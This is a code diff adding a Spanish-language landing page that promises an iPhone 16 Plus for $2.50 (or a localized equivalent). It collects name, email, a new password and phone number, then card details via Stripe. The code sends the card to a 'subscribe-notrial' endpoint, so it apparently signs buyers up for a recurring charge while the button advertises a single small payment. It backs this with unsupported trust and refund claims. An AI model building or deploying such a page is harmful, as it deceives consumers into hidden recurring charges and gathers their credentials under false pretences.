@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+
+<!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-FDQ6REQWS8');
+  </script>
+
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
+  <title>¡Obtén el iPhone 16 Plus por <span id="titlePrice" data-price>$2.50</span>!</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;2.50;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg:#ffffff; --card:#f8f9fc; --text:#111; --muted:#555; --line:#ddd; --cta1:#ffd76b; --cta2:#ffb429; --radius:16px;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif; 
+      background:var(--bg); color:var(--text);
+      display:flex; flex-direction:column; align-items:center; justify-content:flex-start;
+      padding:18px 14px 40px;
+    }
+    .shell{ width:min(900px,100%); display:flex; flex-direction:column; gap:18px }
+    .card{
+      width:min(700px,100%); background:var(--card); border:1px solid var(--line);
+      border-radius:var(--radius); padding:24px; box-shadow:0 8px 20px rgba(0,0,0,.05); margin-inline:auto;
+    }
+    .title{ font-size:28px; font-weight:900; text-align:center; margin:4px 0 14px }
+    .sub{ text-align:center; color:var(--muted); margin-top:-6px; margin-bottom:16px }
+    .img-wrap{ display:flex; justify-content:center; padding:10px 0 16px }
+    .img-wrap img{ width:min(360px,80%); height:auto; border-radius:18px; border:1px solid #eee; }
+    .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
+    .input{ width:100%; padding:12px; border:1px solid #ccc; background:#fff; color:#111; border-radius:10px; font-size:16px; }
+    .btn{
+      width:100%; border:none; color:#111; border-radius:12px; padding:12px 16px;
+      font-weight:900; cursor:pointer; font-size:16px; 
+      background:linear-gradient(180deg,var(--cta1),var(--cta2));
+      box-shadow:0 8px 18px rgba(255,174,15,.25);
+    }
+    .btn-row{ display:flex; gap:12px; margin-top:12px }
+    .muted-btn{ background:#eee; color:#333; border:1px solid #ddd; }
+    .step{ display:none }
+    .step[aria-hidden="false"]{ display:block }
+    .label{font-weight:700; margin:4px 0 8px; font-size:14px; color:#333}
+    .el{ width:100%; background:#fff; color:#111; border:1px solid #ccc; border-radius:10px; padding:12px; }
+    .brands{display:flex; justify-content:center; gap:12px; margin:14px 0 6px}
+    .brands img{height:22px}
+    .trust-text{ font-size:13px; color:#666; text-align:center; margin-top:12px }
+    #err{ width:100%; margin-top:10px; font-size:14px; color:#b00020; background:#fde9eb; border:1px solid #e5b2b8; border-radius:10px; padding:8px; display:none; }
+    #err[aria-hidden="false"]{ display:block; }
+    .loading-overlay{ position:fixed; inset:0; background:rgba(255,255,255,.9); display:none; align-items:center; justify-content:center; flex-direction:column; z-index:9999; text-align:center; }
+    .loading-overlay[aria-hidden="false"]{ display:flex }
+    .loading-box{ width:min(92vw,460px); background:#fff; border:1px solid #ddd; border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.08); padding:20px; text-align:center; }
+    .loading-title{ font-weight:800; margin:2px 0 10px; color:#111 }
+    .progress-wrap{ width:100%; height:10px; background:#eee; border-radius:999px; overflow:hidden; }
+    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg, var(--cta1), var(--cta2)); animation: loadingBar 2.2s ease-in-out infinite; }
+    @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }
+
+    /* Phone prefix + number layout */
+    .phone-wrap{ display:grid; grid-template-columns:140px 1fr; gap:8px; }
+    @media (max-width:520px){
+      .phone-wrap{ grid-template-columns:1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- GoAffPro loader (keep this so the next page can track) -->
+<script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+
+  <div class="shell">
+
+    <!-- PASO 1 -->
+    <section id="step1" class="card step" aria-hidden="false">
+      <h1 class="title">
+        ¡Obtén el iPhone 16 Plus por <span id="priceHero" data-price>$2.50</span>!
+      </h1>
+      <p class="sub">Oferta por tiempo limitado. ¡Asegura tu nuevo iPhone hoy!</p>
+
+      <div class="img-wrap">
+        <img src="Screenshot 2025-08-30 134339.png" alt="iPhone 16 Plus"/>
+      </div>
+
+      <div class="grid">
+        <input class="input" id="nameInput" placeholder="Nombre completo" autocomplete="name" required />
+        <input class="input" id="emailInput" type="email" placeholder="tucorreo@ejemplo.com" autocomplete="email" required />
+        <!-- Contraseña (izq.) + Teléfono (der.) -->
+        <input class="input" id="passwordInput" type="password" placeholder="Crea una contraseña" autocomplete="new-password" required />
+        <div class="phone-wrap">
+          <select id="phonePrefix" class="input" aria-label="Prefijo internacional"></select>
+          <input id="phoneNumber" class="input" inputmode="tel" placeholder="Número de teléfono" autocomplete="tel-national" />
+        </div>
+      </div>
+
+      <div class="btn-row">
+        <button id="nextBtn" class="btn">Siguiente paso →</button>
+      </div>
+      <p class="trust-text">Nunca compartiremos tu correo. Privacidad 100% garantizada.</p>
+    </section>
+
+    <!-- PASO 2 -->
+    <section id="step2" class="card step" aria-hidden="true">
+      <h2 class="title">Pago seguro</h2>
+      <p class="sub">Tus datos están seguros — con tecnología de Stripe.</p>
+
+      <!-- Dirección de facturación -->
+      <div class="label">Dirección</div>
+      <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Dirección"/>
+
+      <div class="grid" style="margin-top:10px">
+        <div>
+          <div class="label">Ciudad</div>
+          <input id="billingCity" class="input" autocomplete="address-level2" placeholder="Ciudad"/>
+        </div>
+        <div>
+          <div class="label">Código postal</div>
+          <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Código postal"/>
+        </div>
+      </div>
+
+      <div class="label" style="margin-top:10px">País</div>
+      <select id="billingCountry" class="input" autocomplete="country"></select>
+
+      <div id="gpay-button" style="margin-top:8px"></div>
+
+      <div class="label">Número de tarjeta</div>
+      <div id="card-number" class="el"></div>
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px">
+        <div>
+          <div class="label">Vencimiento</div>
+          <div id="card-expiry" class="el"></div>
+        </div>
+        <div>
+          <div class="label">CVC</div>
+          <div id="card-cvc" class="el"></div>
+        </div>
+      </div>
+
+      <div id="err" role="alert" aria-hidden="true"></div>
+
+      <div class="btn-row">
+        <button id="backBtn" class="btn muted-btn">← Atrás</button>
+        <button class="btn" id="payNow">Pagar <span id="priceButton" data-price>$2.50</span> de forma segura</button>
+      </div>
+
+      <div class="brands">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard">
+        <img src="https://charmr.xyz/logos/amex.png" alt="Amex">
+        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay">
+      </div>
+
+      <p class="trust-text">🔒 Cifrado SSL de 256 bits · Con tecnología de Stripe · Garantía de reembolso de 30 días</p>
+    </section>
+  </div>
+
+  <!-- Capa de carga -->
+  <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
+    <div class="loading-box">
+      <div class="loading-title">Procesando tu pago…</div>
+      <div class="progress-wrap"><div class="progress-bar"></div></div>
+      <p class="sub">Espera por favor, esto puede tardar unos segundos.</p>
+    </div>
+  </div>
+
+  <!-- Stripe.js -->
+  <script src="https://js.stripe.com/v3"></script>
+  <script>
+    /* ---------- Navegación de pasos ---------- */
+
+    /* Base de API para pruebas con archivo local (sin cambios en endpoints) */
+    const API_BASE = (() => {
+      if (location.protocol.startsWith('http')) return location.origin;
+      return "http://localhost:10000";
+    })();
+
+    const step1=document.getElementById('step1'),step2=document.getElementById('step2');
+    const nameInput=document.getElementById('nameInput');
+    const emailInput=document.getElementById('emailInput');
+    const passwordInput=document.getElementById('passwordInput');
+    const phonePrefix=document.getElementById('phonePrefix');
+    const phoneNumber=document.getElementById('phoneNumber');
+
+    // Dirección de facturación
+    const billingStreet   = document.getElementById('billingStreet');
+    const billingCity     = document.getElementById('billingCity');
+    const billingPostcode = document.getElementById('billingPostcode');
+    const billingCountry  = document.getElementById('billingCountry');
+
+    async function ensureAccount(){
+      const email=(emailInput.value||'').trim();
+      const password=passwordInput.value||'';
+      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
+      const prefix=(phonePrefix?.value||'+1').trim();
+      const phone = rawPhone ? `${prefix}${rawPhone}` : '';
+      if(!email || !password) throw new Error("Ingresa correo y contraseña.");
+      const res=await fetch(`${API_BASE}/api/register`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({email,password,phone})
+      });
+      if(res.status===201) return true;
+      let data={}; try{ data=await res.json(); }catch{}
+      if(res.status===400 && /exists/i.test(data?.error||"")) return true;
+      throw new Error(data?.error||"No se pudo crear la cuenta");
+    }
+
+    document.getElementById('nextBtn').onclick=async()=>{ 
+      if(!nameInput.value||!emailInput.value||!passwordInput.value){alert("Por favor, completa tus datos");return}
+      try{
+        await ensureAccount();
+      }catch(e){
+        alert(e.message||"Hubo un problema al crear tu cuenta. Inténtalo de nuevo.");
+        return;
+      }
+      localStorage.setItem("checkout_name",nameInput.value);
+      localStorage.setItem("checkout_email",emailInput.value);
+      step1.setAttribute("aria-hidden","true");
+      step2.setAttribute("aria-hidden","false");
+    };
+    document.getElementById('backBtn').onclick=()=>{ 
+      step1.setAttribute("aria-hidden","false");step2.setAttribute("aria-hidden","true");
+    };
+
+    /* ---------- Prefijos telefónicos (incluye ES, AR, EC, PA, CR, CO, VE, PE, BO, CL) ---------- */
+    const CALLING_CODES = {
+      ES:{ code:'+34',  name:'España' },
+      AR:{ code:'+54',  name:'Argentina' },
+      EC:{ code:'+593', name:'Ecuador' },
+      PA:{ code:'+507', name:'Panamá' },
+      CR:{ code:'+506', name:'Costa Rica' },
+      CO:{ code:'+57',  name:'Colombia' },
+      VE:{ code:'+58',  name:'Venezuela' },
+      PE:{ code:'+51',  name:'Perú' },
+      BO:{ code:'+591', name:'Bolivia' },
+      CL:{ code:'+56',  name:'Chile' },
+
+      US:{ code:'+1',   name:'Estados Unidos' },
+      CA:{ code:'+1',   name:'Canadá' },
+      GB:{ code:'+44',  name:'Reino Unido' },
+      IE:{ code:'+353', name:'Irlanda' },
+      AU:{ code:'+61',  name:'Australia' },
+      NZ:{ code:'+64',  name:'Nueva Zelanda' },
+      DE:{ code:'+49',  name:'Alemania' },
+      FR:{ code:'+33',  name:'Francia' },
+      IT:{ code:'+39',  name:'Italia' },
+      NL:{ code:'+31',  name:'Países Bajos' },
+      SE:{ code:'+46',  name:'Suecia' },
+      NO:{ code:'+47',  name:'Noruega' },
+      DK:{ code:'+45',  name:'Dinamarca' },
+      FI:{ code:'+358', name:'Finlandia' },
+      BE:{ code:'+32',  name:'Bélgica' },
+      AT:{ code:'+43',  name:'Austria' },
+      CH:{ code:'+41',  name:'Suiza' },
+      PT:{ code:'+351', name:'Portugal' },
+      PL:{ code:'+48',  name:'Polonia' },
+      RO:{ code:'+40',  name:'Rumanía' },
+      CZ:{ code:'+420', name:'Chequia' },
+      SK:{ code:'+421', name:'Eslovaquia' },
+      HU:{ code:'+36',  name:'Hungría' },
+      GR:{ code:'+30',  name:'Grecia' }
+    };
+
+    /* Países para el autocompletado del paso 2 (incluye los solicitados) */
+    const COUNTRY_CHOICES = {
+      ES:'España', AR:'Argentina', EC:'Ecuador', PA:'Panamá', CR:'Costa Rica',
+      CO:'Colombia', VE:'Venezuela', PE:'Perú', BO:'Bolivia', CL:'Chile',
+
+      US:'Estados Unidos', CA:'Canadá', GB:'Reino Unido', IE:'Irlanda',
+      DE:'Alemania', FR:'Francia', IT:'Italia', NL:'Países Bajos'
+    };
+
+    const PRIORITY_LATAM = ['ES','AR','EC','PA','CR','CO','VE','PE','BO','CL'];
+
+    function buildPrefixOptions(selectEl, prefer) {
+      if(!selectEl) return;
+      selectEl.innerHTML = "";
+      const order = [...new Set([...(prefer ? [prefer] : []), ...PRIORITY_LATAM, ...Object.keys(CALLING_CODES)])];
+      const seen = new Set();
+      for (const cc of order) {
+        const data = CALLING_CODES[cc];
+        if (!data) continue;
+        const key = `${data.code}|${data.name}`;
+        if (seen.has(key)) continue;
+        const opt = new Option(`${data.code} — ${data.name}`, data.code, false, false);
+        selectEl.append(opt);
+        seen.add(key);
+      }
+      // Selección inicial
+      if (prefer && CALLING_CODES[prefer]) {
+        selectEl.value = CALLING_CODES[prefer].code;
+      } else {
+        selectEl.value = CALLING_CODES.ES.code; // por defecto España
+      }
+    }
+
+    function populateCountrySelect(prefer){
+      if(!billingCountry) return;
+      billingCountry.innerHTML = '';
+      const order = [...new Set([...(prefer ? [prefer] : []), ...PRIORITY_LATAM, ...Object.keys(COUNTRY_CHOICES)])];
+      for (const cc of order) {
+        const label = COUNTRY_CHOICES[cc];
+        if (!label) continue;
+        billingCountry.append(new Option(label, cc, false, false));
+      }
+      if (prefer && COUNTRY_CHOICES[prefer]) billingCountry.value = prefer;
+      if (!billingCountry.value) billingCountry.value = 'ES';
+    }
+
+    /* ---------- Precio local por IP (equivalente a $2.50, redondeado) ---------- */
+    const LOCAL_PRICES = {
+      ES: '€2',
+      AR: 'ARS 2.500',
+      EC: '$3',
+      PA: '$3',
+      CR: '₡1.300',
+      CO: 'COP 10.000',
+      VE: 'VES 100',
+      PE: 'S/ 9',
+      BO: 'BOB 17',
+      CL: 'CLP 2.500'
+    };
+
+    function applyLocalizedPrice(cc){
+      const text = LOCAL_PRICES[cc] || '$2.50';
+      document.querySelectorAll('[data-price]').forEach(el => { el.textContent = text; });
+      // Título del documento también
+      const t = `¡Obtén el iPhone 16 Plus por ${text}!`;
+      try {
+        // El título original contiene un span; ajustamos document.title solo por accesibilidad/SEO
+        document.title = t;
+      } catch {}
+    }
+
+    // Relleno inicial (ES por defecto)
+    buildPrefixOptions(phonePrefix, 'ES');
+    populateCountrySelect('ES');
+    applyLocalizedPrice('ES');
+
+    // Geo IP para ajustar país, ciudad, prefijo y precio
+    (function geoAndPriceByIP(){
+      const withTimeout = (ms,p)=>Promise.race([p,new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),ms))]);
+      fetch('https://ipapi.co/json/')
+        .then(r => r.ok ? r.json() : Promise.reject())
+        .then(d => {
+          const cc = String(d.country_code || d.country || 'ES').toUpperCase();
+          const city = d.city || '';
+          // Prefijo y país priorizando el detectado
+          buildPrefixOptions(phonePrefix, cc);
+          populateCountrySelect(cc);
+          if (city && !billingCity.value) billingCity.value = city;
+          // Precio local
+          applyLocalizedPrice(cc);
+        })
+        .catch(() => {
+          // Fallback: idioma del navegador
+          try {
+            const loc = Intl.DateTimeFormat().resolvedOptions().locale || 'es-ES';
+            const cc = (loc.split('-')[1] || 'ES').toUpperCase();
+            buildPrefixOptions(phonePrefix, cc);
+            populateCountrySelect(cc);
+            applyLocalizedPrice(cc);
+          } catch {
+            // ya está ES por defecto
+          }
+        });
+    })();
+
+    /* ---------- Stripe (sin cambios en endpoints ni IDs) ---------- */
+    const SUBSCRIBE_URL="https://charmr-jfmc.onrender.com/api/stripe/subscribe-notrial";
+    const PUBLISHABLE_KEY="pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+    const FIXED_PRICE_ID="price_1Rzdp0EJXIhiKzYGlVxHGH7W";
+    const stripe=Stripe(PUBLISHABLE_KEY),elements=stripe.elements();
+    const cardNumber=elements.create("cardNumber"),cardExpiry=elements.create("cardExpiry"),cardCvc=elements.create("cardCvc");
+    cardNumber.mount("#card-number");cardExpiry.mount("#card-expiry");cardCvc.mount("#card-cvc");
+    const $err=document.getElementById("err"),overlay=document.getElementById("loading-overlay");
+    function showError(m){$err.textContent=m;$err.style.display="block"}
+    function hideError(){$err.textContent="";$err.style.display="none"}
+    function showLoading(){overlay.setAttribute("aria-hidden","false")}
+    function hideLoading(){overlay.setAttribute("aria-hidden","true")}
+    document.getElementById("payNow").onclick=async()=>{
+      hideError();showLoading();
+
+      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
+      const prefix=(phonePrefix?.value||'+34').trim();
+      const fullPhone = rawPhone ? `${prefix}${rawPhone}` : undefined;
+
+      const addr = {
+        line1: (billingStreet?.value||'').trim() || undefined,
+        city: (billingCity?.value||'').trim() || undefined,
+        postal_code: (billingPostcode?.value||'').trim() || undefined,
+        country: (billingCountry?.value||'').trim() || undefined // ISO-2
+      };
+
+      const pm=await stripe.createPaymentMethod({
+        type:"card",
+        card:cardNumber,
+        billing_details:{
+          name:nameInput.value || undefined,
+          email:emailInput.value || undefined,
+          phone: fullPhone,
+          address: addr
+        }
+      });
+
+      if(pm.error){hideLoading();showError(pm.error.message);return}
+
+      const res=await fetch(SUBSCRIBE_URL,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+          priceId:FIXED_PRICE_ID,
+          paymentMethodId:pm.paymentMethod.id,
+          name:nameInput.value,
+          email:emailInput.value
+        })
+      });
+      const data=await res.json();
+      if(!data.clientSecret){hideLoading();showError("No se pudo iniciar el pago");return}
+      const conf=await stripe.confirmCardPayment(data.clientSecret);
+      if(conf.error){hideLoading();showError(conf.error.message);return}
+      if(conf.paymentIntent&&conf.paymentIntent.status==="succeeded"){window.location.href="thankyou-iphone.html"}else{hideLoading();showError("Pago no completado")}
+    };
+  </script>
+</body>
+</html>
